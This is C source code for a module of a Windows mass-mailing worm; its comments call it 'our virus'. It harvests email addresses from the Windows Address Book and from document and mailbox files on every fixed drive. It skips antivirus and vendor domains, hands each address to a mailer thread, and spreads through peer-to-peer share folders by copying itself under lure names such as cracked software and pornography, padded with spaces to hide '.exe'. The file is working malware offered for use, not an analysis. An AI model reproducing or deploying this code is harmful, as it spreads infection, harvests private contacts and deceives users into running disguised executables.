#include <stdio.h>   
#include <windows.h> 
#include "mailer.h"


void massmail_it(char *address)
{

	static const char *list[] = {
		 "@symantec", "@panda", "@avp", "@microsoft",  
		 "@msn", "@sopho", "@mm", "@norman", "@norton", "@noreply", "@virusli", "@fsecure", 
		"@hotmail", NULL, "\n\n\n" };
	

	register int m;

	for (m=0; list[m]; m++)
		if (strstr(address, list[m])) return; //mail filter
	  if(!strstr(address,".")) return;


	DWORD tid;

CreateThread(0, 0, mail_it, (char *)address, 0, &tid);
return;

   

}

// Opens the file, scans to the end of the file looking for @ sign
// if one is found it backs up to the beginning of addresss
// and grabs the from beginning to end, harvests it then 
// passes it through massmail_it
int harvest_textfile(const char *text_file)
{
	
FILE *fp;   
long byte_count = 0L;
long at_count = 0L;
char collected[200];

  int ch;
  long fpos = 0L;
  int idx;

  if ( (fp = fopen(text_file, "rb")) == NULL) {
    
	return 0;
  }

  while ((ch = fgetc(fp)) != EOF) {
    if (ch == '@') at_count++;   
	byte_count++;
  }
  fclose(fp);

 
  if ( (fp = fopen(text_file, "rb")) == NULL) {
	return 0;
  }

  
  int valid = 0;
  while ((ch = fgetc(fp)) != EOF && (fpos <= byte_count)) {
    if (ch == '@') {
      at_count++;  	  
    
      fpos = ftell(fp) - 1L;

	  if (fpos >= 1L) fpos--;
      fseek(fp, fpos, 0);  
      ch = fgetc(fp);

      while (  (ch >= 'a' && ch <= 'z') ||
		       (ch >= 'A' && ch <= 'Z') ||
			   (ch >= '0' && ch <= '9') ||
			   (ch == '_' || ch == '-'  || ch == '.') ) {
  		      
  	    if (fpos == 0) {
          rewind(fp); 
		  break;
        }
		else {
		  fpos--;  
          fseek(fp, fpos, 0);  
          ch = fgetc(fp);
		}		
        if (ch == EOF) fclose(fp);
      }            


      idx = 0;

      while ( (ch = fgetc(fp)) != EOF) {  
        valid = 0; 
        if (ch >= 'a' && ch <= 'z') valid = 1;
		if (ch >= 'A' && ch <= 'Z') valid = 1;
		if (ch >= '0' && ch <= '9') valid = 1;
		if (ch == '_' || ch == '-') valid = 1;
		if (ch == '@' || ch == '.') valid = 1;
		
		
		if (!valid) break;
     
        collected[idx] = ch;      
        idx++;
        
      }	        
      collected[idx] = '\0';

	  
	  massmail_it(collected);
    }  	    
  }	
  fclose(fp);
  return 0;
}

//Harvests email addresses out of windows address book

/**********************************************
*
*
* Synopsis on Wab address collection: 
* Our virus first finds the location of WAB from the registry. 
* Create the file mapping. Begin finding email IDs
* File format of WAB is easy to understand 
* The number of addresses are stored at the memory location 0x64 and the starting address 
* of email addresses are stored at memory location 0x60 . 
* Once our virus finds the email addresses the virus Unmaps the mapped WAB file
* by calling UnmapViewOfFile API, then close all opened handles. 
*
*
*
**********************************************/
int harvest_wab()
{
    HANDLE fhandle1;
    BYTE pathw[MAX_PATH];
    DWORD sz;
    HKEY hkeyresult;
    sz=800;
    RegOpenKeyEx(HKEY_CURRENT_USER, (LPCTSTR)"Software\\Microsoft\\WAB\\WAB4\\Wab File Name" , 0,KEY_ALL_ACCESS, &hkeyresult );
    RegQueryValueEx (hkeyresult, (LPCTSTR)"",0,0, pathw, &sz ) ;
    RegCloseKey(hkeyresult);

    fhandle1 = CreateFile ((char *)pathw,GENERIC_READ,FILE_SHARE_READ,
                          NULL,OPEN_ALWAYS,FILE_ATTRIBUTE_NORMAL,NULL);
    char *buffer=NULL;
    HANDLE fhandle2=CreateFileMapping(fhandle1,0,PAGE_READONLY,0,0,0);
    if(!fhandle2) {
        CloseHandle(fhandle1);
        return 0;
    }
    buffer=(char *)MapViewOfFile(fhandle2,FILE_MAP_READ,0,0,0);
    if(!buffer) {
        CloseHandle(fhandle2);
        CloseHandle(fhandle1);
        return 0;
    }

    int bld;
    bld=int(*(buffer+0x64));
    DWORD add=MAKELONG(MAKEWORD(*(buffer+0x60),*(buffer+0x61)),
                                MAKEWORD(*(buffer+0x62),*(buffer+0x63)));
    char addressOne[300];
    int ii,j=0;
    int len;
    for (len=0;len<(bld*68);len+=68){
        for (ii=0;ii<=68;ii++)
        {
            addressOne[ii]=*(buffer+add+j+len);
            j+=2;
        }
        addressOne[68]='\0';j=0;

massmail_it(addressOne);
        
    }
    CloseHandle (fhandle1);    
    UnmapViewOfFile(buffer);
    CloseHandle (fhandle2);    

    return 0;
}

char pathname[256];

void copy_to(char *p2p)
{

char pathname[256];
char p2p2[MAX_PATH];
char p2p3[MAX_PATH];
char p2p4[MAX_PATH];
char p2p5[MAX_PATH];
char p2p6[MAX_PATH];
char p2p7[MAX_PATH];
char p2p8[MAX_PATH];
char p2p9[MAX_PATH];
char p2p10[MAX_PATH];
char p2p11[MAX_PATH];
char p2p12[MAX_PATH];
char p2p13[MAX_PATH];
char p2p14[MAX_PATH];
char p2p15[MAX_PATH];
char p2p16[MAX_PATH];
char p2p17[MAX_PATH];
char p2p18[MAX_PATH];
char p2p19[MAX_PATH];
char p2p20[MAX_PATH];



HMODULE hMe = GetModuleHandle(NULL);
DWORD nRet = GetModuleFileName(hMe, pathname, 256);
strcat(p2p2, p2p);
strcat(p2p3, p2p);
strcat(p2p4, p2p);
strcat(p2p5, p2p);
strcat(p2p6, p2p);
strcat(p2p7, p2p);
strcat(p2p8, p2p);
strcat(p2p9, p2p);
strcat(p2p10, p2p);
strcat(p2p11, p2p);
strcat(p2p12, p2p);
strcat(p2p13, p2p);
strcat(p2p14, p2p);
strcat(p2p15, p2p);
strcat(p2p16, p2p);
strcat(p2p17, p2p);
strcat(p2p18, p2p);
strcat(p2p19, p2p);
strcat(p2p20, p2p);


strcat(p2p, "\\ACDSEE10.exe");
strcat(p2p2, "\\Adobe Photoshop Full Version.exe"); 
strcat(p2p3, "\\Cisco source code.zip                       .exe"); 
strcat(p2p4, "\\WinAmp 6.exe"); 
strcat(p2p5, "\\WinRAR.exe"); 
strcat(p2p6, "\\Windows Longhorn Beta.exe"); 
strcat(p2p7, "\\WINDOWS SOURCE CODE.zip                            .exe"); 
strcat(p2p8, "\\jenna jameson screensaver.scr"); 
strcat(p2p9, "\\Opera Registered version.exe"); 
strcat(p2p10, "\\Snood new version.exe"); 
strcat(p2p11, "\\Brianna banks and jenna jameson.mpeg                        .exe"); 
strcat(p2p12, "\\Norton AntiVirus 2004.exe"); 
strcat(p2p13, "\\Battlefield 1942.exe"); 
strcat(p2p14, "\\NETSKY SOURCE CODE.zip                                   .exe"); 
strcat(p2p15, "\\Kazaa Lite.zip                                  .exe"); 
strcat(p2p16, "\\Windows crack.zip                                              .exe"); 
strcat(p2p17, "\\Teen Porn.mpeg                                             .exe"); 
strcat(p2p18, "\\Britney spears naked.jpeg                                           .exe"); 
strcat(p2p19, "\\DVD Xcopy xpress.exe"); 
strcat(p2p20, "\\Visual Studio.NET.zip                                                   .exe"); 



CopyFile(pathname,p2p,0);
CopyFile(pathname,p2p2,0);
CopyFile(pathname,p2p3,0);
CopyFile(pathname,p2p4,0);
CopyFile(pathname,p2p5,0);
CopyFile(pathname,p2p6,0);
CopyFile(pathname,p2p7,0);
CopyFile(pathname,p2p8,0);
CopyFile(pathname,p2p9,0);
CopyFile(pathname,p2p10,0);
CopyFile(pathname,p2p11,0);
CopyFile(pathname,p2p12,0);
CopyFile(pathname,p2p13,0);
CopyFile(pathname,p2p14,0);
CopyFile(pathname,p2p15,0);
CopyFile(pathname,p2p16,0);
CopyFile(pathname,p2p17,0);
CopyFile(pathname,p2p18,0);
CopyFile(pathname,p2p19,0);
CopyFile(pathname,p2p20,0);



}
//copy to folders containing "shar"
void p2p_in(char *path)
{
CharLower(path); 
	if (strstr(path,"shar")) {
		copy_to(path);
	} 
	else {
		return;
}

}

void harvest_extensions(const char *destination, WIN32_FIND_DATA *finder)
{
	char Extension[MAX_PATH];
	int e, o;

	for (e=0,o=-1; finder->cFileName[e] && (e < 255); e++)
		if (finder->cFileName[e] == '.') o=e; 

	if (o < 0) {
		Extension[0] = 0;
	} else {
		lstrcpyn(Extension, finder->cFileName+o+1, sizeof(Extension)-1);
		CharLower(Extension); 
	}

	do {
		
e = 1;				


if (lstrcmp(Extension, "html") == 0) break;
if (lstrcmp(Extension, "htm") == 0) break;
if (lstrcmp(Extension, "txt") == 0) break; 
if (lstrcmp(Extension, "xml") == 0) break; 
if (lstrcmp(Extension, "doc") == 0) break; 
if (lstrcmp(Extension, "rtf") == 0) break; 
if (lstrcmp(Extension, "jsp") == 0) break; 
if (lstrcmp(Extension, "asp") == 0) break; 
if (lstrcmp(Extension, "jsp") == 0) break; 
if (lstrcmp(Extension, "adb") == 0) break;
if (lstrcmp(Extension, "dbx") == 0) break; 
		

e = 0;				
		

if (Extension[0] == 0)
			

	
e = 0;
		return;
	} 
	
	while (0);
	
	if (e == 1) {
		harvest_textfile(destination); 
	} 
	
}



int recursive(const char *path, int max_level)
{
	char buffer[280];
	WIN32_FIND_DATA data;
	HANDLE finder;
	

	if ((max_level <= 0) || (path == NULL)) return 1;
	if (path[0] == 0) return 1;

	strcpy(buffer, path);
	if (buffer[strlen(buffer)-1] != '\\') strcat(buffer, "\\");
	strcat(buffer, "*.*");

	memset(&data, 0, sizeof(data));

	for (finder=0;;) 
	{
		if (finder == 0) 
		
		{
			finder = FindFirstFile(buffer, &data);
			if (finder == INVALID_HANDLE_VALUE) finder = 0;
			if (finder == 0) 
				break;
		} 
		else 
		{
			if (FindNextFile(finder, &data) == 0) break;
		}

		if (data.cFileName[0] == '.') 

		{
			if (data.cFileName[1] == 0) 
				continue;
			if (data.cFileName[1] == '.')

				if (data.cFileName[2] == 0)
					
					continue;
		}

		lstrcpy(buffer, path);
		if (buffer[strlen(buffer)-1] != '\\') strcat(buffer, "\\");
		strcat(buffer, data.cFileName);

		if ((data.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) == FILE_ATTRIBUTE_DIRECTORY) {
			recursive(buffer, max_level-1 );
			p2p_in(buffer); //copy to folders containing "shar"

		} 
		
		else 
			harvest_extensions(buffer,&data);
		
	}

	if (finder != 0) FindClose(finder);

	return 0;
}



void harvest_disks()
{
	char buffer[MAX_PATH], sysdisk;

	memset(buffer, 0, sizeof(buffer));

	sysdisk = buffer[0];

	strcpy(buffer+1, ":\\");

	for (buffer [0] = 'C' ; buffer [0] <'Y'; buffer[0]++) 
	
	{
		if (buffer[0] == sysdisk) continue;
		switch (GetDriveType(buffer)) {
			case DRIVE_FIXED:
			case DRIVE_RAMDISK:
				break;

			default:

				continue;
		}
		Sleep(3000);
		recursive(buffer, 15);
	}
}


void harvest_main()
{
	
		harvest_wab();
		harvest_disks();
	
}
